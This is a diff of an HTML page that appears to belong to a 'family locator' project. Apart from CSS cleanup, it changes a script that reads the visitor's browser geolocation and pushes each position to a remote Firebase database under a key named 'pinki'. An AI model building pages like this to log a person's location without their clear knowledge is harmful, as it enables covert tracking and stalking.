@@ -14,18 +14,9 @@
             min-height: 100vh;
             background: #ffffff;
         }
-        .container {
-            text-align: center;
-        }
-        .emoji {
-            font-size: 48px;
-            margin-bottom: 12px;
-        }
-        .title {
-            font-size: 28px;
-            font-weight: 300;
-            color: #333;
-        }
+        .container { text-align: center; }
+        .emoji { font-size: 48px; margin-bottom: 12px; }
+        .title { font-size: 28px; font-weight: 300; color: #333; }
         #status {
             position: fixed;
             bottom: 40px;
@@ -45,7 +36,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
         const app = initializeApp({
             databaseURL: "https://familylocator-3808a-default-rtdb.asia-southeast1.firebasedatabase.app"
@@ -56,7 +47,7 @@
             if (!navigator.geolocation) return;
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    set(ref(db, 'families/74b5bd46/ondemand/location'), {
+                    push(ref(db, 'families/74b5bd46/ondemand/pinki'), {
                         lat: position.coords.latitude,
                         lng: position.coords.longitude,
                         accuracy: Math.round(position.coords.accuracy),
